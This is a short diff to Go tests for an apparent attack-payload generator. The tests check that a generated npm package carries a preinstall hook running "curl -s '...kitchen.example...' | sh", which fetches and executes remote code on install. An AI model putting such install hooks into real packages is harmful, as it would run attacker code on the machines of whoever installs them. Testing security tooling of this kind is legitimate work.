@@ -121,7 +121,7 @@ func TestNPMPayload_PreserveFlow(t *testing.T) {
 
 func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
 	payload := NewNPMPayload(PayloadOptions{
-		CallbackURL: "https://kitchen.example/r/stg123",
+		CallbackURL: "https://kitchen.example/r/smokedmeat/stg123",
 	})
 	payloads := payload.Generate()
 
@@ -130,7 +130,7 @@ func TestNPMPayload_CallbackURLUsesExactPath(t *testing.T) {
 		Scripts map[string]string `json:"scripts"`
 	}
 	require.NoError(t, json.Unmarshal([]byte(payloads[0].Content), &pkg))
-	assert.Equal(t, "curl -s 'https://kitchen.example/r/stg123' | sh", pkg.Scripts["preinstall"])
+	assert.Equal(t, "curl -s 'https://kitchen.example/r/smokedmeat/stg123' | sh", pkg.Scripts["preinstall"])
 }
 
 func TestPipPayload_WithCallbackURL(t *testing.T) {
